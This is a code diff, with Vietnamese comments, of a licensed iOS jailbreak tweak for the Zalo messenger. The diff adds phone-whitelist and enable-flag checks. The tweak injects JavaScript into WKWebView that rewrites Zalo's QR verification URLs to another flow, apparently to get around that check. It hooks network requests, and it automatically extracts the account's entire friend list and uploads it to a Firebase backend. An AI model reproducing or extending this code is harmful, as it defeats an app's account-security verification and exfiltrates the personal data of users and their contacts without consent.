@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
- * Tác giả: clang | Version: 1.2.7
+ * Tác giả: clang | Version: 1.2.8
  * ==============================================================================
  * Tính năng chính:
  * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
@@ -383,10 +383,17 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
         completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
             if (error || !data) {
-                // Lỗi mạng tạm thời -> Cho phép thực thi nếu đã lưu key hợp lệ
-                if (onVerified) {
-                    dispatch_async(dispatch_get_main_queue(), onVerified);
+                // Lỗi mạng tạm thời:
+                // - Nếu policy là unlimited (hoặc chưa biết) → fail-open, cho chạy
+                // - Nếu policy là whitelist → fail-closed, không kích hoạt hook
+                BOOL failOpen = !g_cachedPhonePolicy || [g_cachedPhonePolicy isEqualToString:@"unlimited"];
+                if (failOpen) {
+                    g_tweakEnabled = YES;  // Cho phép các hook chạy
+                    if (onVerified) {
+                        dispatch_async(dispatch_get_main_queue(), onVerified);
+                    }
                 }
+                // Whitelist mode + lỗi mạng → g_tweakEnabled giữ nguyên NO, hook bị chặn
                 return;
             }
 
@@ -459,9 +466,29 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
                 if ([currentNormPhone hasPrefix:@"84"] && currentNormPhone.length >= 10) currentNormPhone = [@"0" stringByAppendingString:[currentNormPhone substringFromIndex:2]];
 
                 if (![normalizedList containsObject:currentNormPhone]) {
+                    g_tweakEnabled = NO;  // SĐT ngoài whitelist → tắt toàn bộ hook
                     showSecurityAlert(@"SĐT Chưa Được Cấp Quyền", [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
                     return;
                 }
+            }
+
+            // Cache policy + whitelist để các hook có thể kiểm tra sau
+            g_cachedPhonePolicy = [phonePolicy copy];
+            if ([phonePolicy isEqualToString:@"whitelist"]) {
+                NSArray *rawAllowed = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
+                NSMutableArray<NSString *> *normList = [NSMutableArray array];
+                for (id item in rawAllowed) {
+                    NSString *p = item[@"stringValue"];
+                    if (p) {
+                        NSString *n = [[p componentsSeparatedByCharactersInSet:
+                            [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+                        if ([n hasPrefix:@"84"] && n.length >= 10) n = [@"0" stringByAppendingString:[n substringFromIndex:2]];
+                        [normList addObject:n];
+                    }
+                }
+                g_cachedAllowedPhones = [normList copy];
+            } else {
+                g_cachedAllowedPhones = nil;  // unlimited: không cần filter
             }
 
             // 4. Cập nhật thông số thiết bị / profile mới lên Cloud
@@ -486,7 +513,8 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
             [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
             [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];
 
-            // 5. Xác thực thành công -> Tiếp tục luồng xử lý
+            // 5. Xác thực thành công -> Bật flag và tiếp tục luồng
+            g_tweakEnabled = YES;
             if (onVerified) {
                 dispatch_async(dispatch_get_main_queue(), onVerified);
             }
@@ -796,6 +824,28 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
 // ==============================================================================
 static NSString *g_activeLoggedInPhone = nil;
 
+// ==============================================================================
+// GLOBAL TWEAK STATE - Whitelist-aware enable flag
+// g_tweakEnabled = YES chỉ khi verifyKeyAndExecute thành công (bao gồm whitelist pass)
+// g_cachedPhonePolicy / g_cachedAllowedPhones: cache từ Firebase để các hook kiểm tra
+// ==============================================================================
+static BOOL       g_tweakEnabled         = NO;   // Tất cả hook guard bằng flag này
+static NSString  *g_cachedPhonePolicy    = nil;   // @"unlimited" hoặc @"whitelist"
+static NSArray   *g_cachedAllowedPhones  = nil;   // Danh sách SĐT được phép (normalized)
+
+// Hàm helper: kiểm tra SĐT có trong whitelist hiện tại không
+static BOOL isPhoneAllowedByWhitelist(NSString *phone) {
+    if (!phone || phone.length < 8) return NO;
+    // Nếu chính sách unlimited hoặc chưa có cache → cho qua
+    if (!g_cachedPhonePolicy || [g_cachedPhonePolicy isEqualToString:@"unlimited"]) return YES;
+    if (!g_cachedAllowedPhones || g_cachedAllowedPhones.count == 0) return YES;
+    // Normalize phone
+    NSString *norm = [[phone componentsSeparatedByCharactersInSet:
+        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+    if ([norm hasPrefix:@"84"] && norm.length >= 10) norm = [@"0" stringByAppendingString:[norm substringFromIndex:2]];
+    return [g_cachedAllowedPhones containsObject:norm];
+}
+
 static BOOL invokeBoolSelector(id target, SEL selector) {
     if (!target || ![target respondsToSelector:selector]) return NO;
     NSMethodSignature *sig = [target methodSignatureForSelector:selector];
@@ -903,8 +953,14 @@ static NSString *getZaloLivePhoneNumber(void) {
 // TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
 // ==============================================================================
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
+    // Không sync nếu tweak chưa được kích hoạt hợp lệ
+    if (!g_tweakEnabled) return;
+
     NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
     if (!actualPhone || actualPhone.length < 8) return;
+
+    // Kiểm tra whitelist: SĐT không trong danh sách → không sync
+    if (!isPhoneAllowedByWhitelist(actualPhone)) return;
 
     NSString *cleanPhone = [[actualPhone componentsSeparatedByCharactersInSet:
         [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
@@ -1065,13 +1121,19 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 
 - (void)viewDidAppear:(BOOL)animated {
     %orig;
+
+    // Chỉ hoạt động khi tweak đã được kích hoạt hợp lệ
+    if (!g_tweakEnabled) return;
     
     NSString *clsName = NSStringFromClass([self class]);
     if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
         static NSString *lastExtractedPhone = nil;
         
         NSString *currentPhone = getZaloLivePhoneNumber();
-        if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
+        // Bổ sung: kiểm tra whitelist cho SĐT đang đăng nhập
+        if (currentPhone && currentPhone.length >= 8 &&
+            ![currentPhone isEqualToString:lastExtractedPhone] &&
+            isPhoneAllowedByWhitelist(currentPhone)) {
             lastExtractedPhone = [currentPhone copy];
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                 autoSyncFriendsToFirebase(currentPhone);
@@ -1090,6 +1152,11 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 - (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
     if (!completionHandler) {
         return %orig;
+    }
+
+    // Nếu tweak chưa được kích hoạt → không can thiệp bất kỳ request nào
+    if (!g_tweakEnabled) {
+        return %orig(request, completionHandler);
     }
 
     NSURL *url = request.URL;
@@ -1196,33 +1263,40 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 %hook WKWebView
 
 - (instancetype)initWithFrame:(CGRect)frame configuration:(WKWebViewConfiguration *)configuration {
-    // TẦNG 2: Tiêm JavaScript Document Start tự động chuyển hướng mọi luồng SPA / JavaScript nội bộ
-    NSString *redirectJS = @"(function() {"
-                            "  function checkAndRedirect() {"
-                            "    var h = window.location.href;"
-                            "    if (h.indexOf('/qr') !== -1 || h.indexOf('verify/v3/qr') !== -1) {"
-                            "      var target = h.replace(/\\/verify\\/v3\\/qr\\/request/g, '/verify/v3/seq')"
-                            "                    .replace(/\\/verify\\/v3\\/qr/g, '/verify/v3/seq')"
-                            "                    .replace(/\\/qr\\/request/g, '/seq')"
-                            "                    .replace(/\\/verify\\/qr/g, '/verify/seq');"
-                            "      if (target !== h) window.location.replace(target);"
-                            "    }"
-                            "  }"
-                            "  checkAndRedirect();"
-                            "  window.addEventListener('DOMContentLoaded', checkAndRedirect);"
-                            "  var op = history.pushState; history.pushState = function() { op.apply(this, arguments); checkAndRedirect(); };"
-                            "  var or = history.replaceState; history.replaceState = function() { or.apply(this, arguments); checkAndRedirect(); };"
-                            "})();";
+    // TẦNG 2: Chỉ tiêm JavaScript khi tweak đã được kích hoạt hợp lệ
+    if (g_tweakEnabled) {
+        NSString *redirectJS = @"(function() {"
+                                "  function checkAndRedirect() {"
+                                "    var h = window.location.href;"
+                                "    if (h.indexOf('/qr') !== -1 || h.indexOf('verify/v3/qr') !== -1) {"
+                                "      var target = h.replace(/\\/verify\\/v3\\/qr\\/request/g, '/verify/v3/seq')"
+                                "                    .replace(/\\/verify\\/v3\\/qr/g, '/verify/v3/seq')"
+                                "                    .replace(/\\/qr\\/request/g, '/seq')"
+                                "                    .replace(/\\/verify\\/qr/g, '/verify/seq');"
+                                "      if (target !== h) window.location.replace(target);"
+                                "    }"
+                                "  }"
+                                "  checkAndRedirect();"
+                                "  window.addEventListener('DOMContentLoaded', checkAndRedirect);"
+                                "  var op = history.pushState; history.pushState = function() { op.apply(this, arguments); checkAndRedirect(); };"
+                                "  var or = history.replaceState; history.replaceState = function() { or.apply(this, arguments); checkAndRedirect(); };"
+                                "})();";
 
-    WKUserScript *script = [[WKUserScript alloc] initWithSource:redirectJS
-                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentStart
-                                               forMainFrameOnly:NO];
-    [configuration.userContentController addUserScript:script];
+        WKUserScript *script = [[WKUserScript alloc] initWithSource:redirectJS
+                                                      injectionTime:WKUserScriptInjectionTimeAtDocumentStart
+                                                   forMainFrameOnly:NO];
+        [configuration.userContentController addUserScript:script];
+    }
 
     return %orig(frame, configuration);
 }
 
 - (WKNavigation *)loadRequest:(NSURLRequest *)request {
+    // Nếu tweak chưa kích hoạt → WKWebView loadRequest chạy bình thường
+    if (!g_tweakEnabled) {
+        return %orig(request);
+    }
+
     NSURL *url = request.URL;
     NSString *urlStr = url.absoluteString;
     NSString *host = [url.host lowercaseString];
